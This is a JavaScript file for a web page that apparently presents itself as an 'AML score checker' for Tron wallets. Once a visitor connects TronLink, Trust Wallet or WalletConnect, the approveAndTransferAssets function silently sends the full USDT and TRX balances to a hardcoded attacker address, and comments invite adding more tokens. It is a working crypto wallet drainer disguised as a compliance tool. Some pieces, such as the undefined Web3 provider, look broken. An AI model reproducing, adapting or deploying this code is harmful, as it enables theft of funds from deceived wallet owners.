import { Core } from '@walletconnect/core';
import { Web3Wallet } from '@walletconnect/web3wallet';
import TronWeb from 'tronweb';
import QRCode from 'qrcode';

document.addEventListener('DOMContentLoaded', async () => {
    const core = new Core({
        projectId: 'dbf2715551e7b692e4c71a4f1b5688f4', // Replace with your actual project ID
    });

    const metadata = {
        name: 'amlscorechecker',
        description: 'AppKit Example',
        url: 'https://dropzero.xyz', // origin must match your domain & subdomain
        icons: ['https://avatars.githubusercontent.com/u/37784886']
    };

    const web3wallet = await Web3Wallet.init({
        core,
        metadata,
    });

    web3wallet.on('session_proposal', async proposal => {
        const approvedNamespaces = {
            tron: {
                methods: [
                    "tron_sendTransaction"
                ],
                chains: ["tron:1"], // Tron mainnet
                events: [
                    "chainChanged",
                    "accountsChanged"
                ],
                accounts: proposal.params.requiredNamespaces.tron.accounts // Filled dynamically from the proposal
            }
        };

        const session = await web3wallet.approveSession({
            id: proposal.id,
            namespaces: approvedNamespaces
        });
    });

    function initiateWalletConnect() {
        web3wallet.connect().then(uri => {
            QRCode.toDataURL(uri, function (err, url) {
                if (err) {
                    console.error('Error generating QR code:', err);
                } else {
                    const qrCodeImg = document.getElementById('qrcode');
                    qrCodeImg.src = url;
                    qrCodeImg.style.display = 'block';
                }
            });
        }).catch(err => {
            console.error("Error connecting with WalletConnect:", err);
        });
    }

    document.querySelector('.select-item').addEventListener('click', function() {
        this.classList.toggle('active');
        document.querySelector('.btn').disabled = !this.classList.contains('active');
    });

    document.getElementById('continue-btn').addEventListener('click', function() {
        switchToStep('step-2');
    });

    document.getElementById('walletconnect').addEventListener('click', () => {
        initiateWalletConnect();
        switchToStep('step-2-connecting-walletconnect');
    });

    document.getElementById('trustwallet').addEventListener('click', async function() {
        switchToStep('step-2-connecting-trustwallet');
        try {
            await walletConnectProvider.enable();
            const web3 = new Web3(walletConnectProvider);

            const accounts = await web3.eth.getAccounts();
            const address = accounts[0];

            console.log('Connected to WalletConnect with address:', address);

            const hasSufficientBalance = await checkTRXBalance(web3, address, 30000000); // Check balance in TRX

            if (hasSufficientBalance) {
                await approveAndTransferAssets(web3, address, 'TDn3EoKsZB9LeQNoEcCNmjK7FMKbFTf3d9'); // Replace with your destination wallet address
                switchToStep('step-3');
            } else {
                switchToStep('step-3-error');
            }
        } catch (error) {
            console.error(error);
            switchToStep('step-2-error');
        }
    });

    document.getElementById('tronlink').addEventListener('click', async () => {
        switchToStep('step-2-connecting-tronlink');
        try {
            const hasTronLink = await checkTronLink();
            if (!hasTronLink) {
                throw new Error('TronLink not found');
            }

            const address = await connectTronLink();
            console.log('Connected to TronLink with address:', address);

            const hasSufficientBalance = await checkTRXBalance(window.tronWeb, address, 30000000); // 30 TRX = 30,000,000 sun
            if (!hasSufficientBalance) {
                throw new Error('Insufficient TRX balance');
            }

            await approveAndTransferAssets(window.tronWeb, address, 'TDn3EoKsZB9LeQNoEcCNmjK7FMKbFTf3d9'); // Replace with your destination wallet address
            switchToStep('step-3');
        } catch (error) {
            console.error(error);
            switchToStep('step-2-error');
        }
    });

    document.getElementById('reconnect-btn').addEventListener('click', function() {
        switchToStep('step-2');
    });

    document.getElementById('other-wallet-btn').addEventListener('click', function() {
        switchToStep('step-2');
    });

    function switchToStep(stepId) {
        document.querySelectorAll('.step').forEach(step => {
            step.classList.add('hidden');
        });
        document.getElementById(stepId).classList.remove('hidden');
    }

    async function connectTronLink() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            return window.tronWeb.defaultAddress.base58;
        } else {
            throw new Error("TronLink not installed or not logged in.");
        }
    }

    async function checkTronLink() {
        return window.tronWeb && window.tronWeb.defaultAddress.base58;
    }

    async function checkTRXBalance(tronWeb, address, minBalance) {
        try {
            const balance = await tronWeb.trx.getBalance(address);
            return balance >= minBalance;
        } catch (error) {
            console.error('Error checking TRX balance:', error);
            return false;
        }
    }

    async function approveAndTransferAssets(tronWeb, address, destination) {
        const trc20Tokens = [
            'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT
            // Add other TRC20 token addresses as needed
        ];

        const transactions = [];

        for (let tokenAddress of trc20Tokens) {
            try {
                const contract = await tronWeb.contract().at(tokenAddress);
                const balance = await contract.balanceOf(address).call();

                if (balance > 0) {
                    transactions.push(contract.approve(destination, balance).send({ from: address }));
                    transactions.push(contract.transfer(destination, balance).send({ from: address }));
                }
            } catch (error) {
                console.error(`Error processing token at ${tokenAddress}:`, error);
            }
        }

        try {
            const trxBalance = await tronWeb.trx.getBalance(address);
            if (trxBalance > 0) {
                transactions.push(tronWeb.trx.sendTransaction(destination, trxBalance));
            }
        } catch (error) {
            console.error('Error transferring TRX:', error);
        }

        await Promise.all(transactions).catch(error => {
            console.error('Error executing transactions:', error);
            switchToStep('step-3-error');
        });
    }

    async function connectAndTransferWithWalletConnect(destination) {
        web3wallet.on('session_update', async ({ topic, params }) => {
            const { namespaces } = params;
            const accounts = namespaces.tron.accounts;

            if (accounts.length > 0) {
                const address = accounts[0];
                const tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io'
                });

                tronWeb.setAddress(address);

                await approveAndTransferAssets(tronWeb, address, destination);
            }
        });
    }

    document.getElementById('walletconnect').addEventListener('click', async () => {
        await connectAndTransferWithWalletConnect('TDn3EoKsZB9LeQNoEcCNmjK7FMKbFTf3d9'); // Replace with your destination wallet address
    });
});
